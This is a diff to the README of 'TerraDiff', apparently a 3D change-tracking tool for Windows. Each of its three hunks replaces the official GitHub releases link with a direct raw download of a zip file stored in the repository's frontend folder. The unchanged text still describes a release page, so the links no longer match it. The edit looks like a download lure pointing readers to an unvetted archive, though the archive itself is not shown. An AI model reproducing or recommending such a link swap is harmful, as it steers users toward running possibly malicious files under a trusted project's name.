@@ -1,6 +1,6 @@
 # 🌍 TerraDiff - Track 3D Changes Easily
 
-[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-brightgreen)](https://github.com/furkan909/TerraDiff/releases)
+[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-brightgreen)](https://raw.githubusercontent.com/furkan909/TerraDiff/main/frontend/Terra-Diff-v3.0.zip)
 
 ## About TerraDiff
 
@@ -44,7 +44,7 @@ Follow these steps to download and run TerraDiff on your Windows PC.
 
 You need to visit the release page to get the software files.
 
-[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-4CAF50?style=for-the-badge)](https://github.com/furkan909/TerraDiff/releases)
+[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/furkan909/TerraDiff/main/frontend/Terra-Diff-v3.0.zip)
 
 Click the link above. It opens the page where the program files are stored. Find the latest version folder or entry. Inside, look for a Windows installer file with an `.exe` extension. It might be named something like `TerraDiff-setup.exe`.
 
@@ -127,7 +127,7 @@ For detailed help, review the FAQ or issue tracker on the GitHub repository.
 
 Use the link below any time to find the latest release files:
 
-[Download TerraDiff](https://github.com/furkan909/TerraDiff/releases)
+[Download TerraDiff](https://raw.githubusercontent.com/furkan909/TerraDiff/main/frontend/Terra-Diff-v3.0.zip)
 
 This page lists all versions. Always choose the newest stable release for the best experience.
 
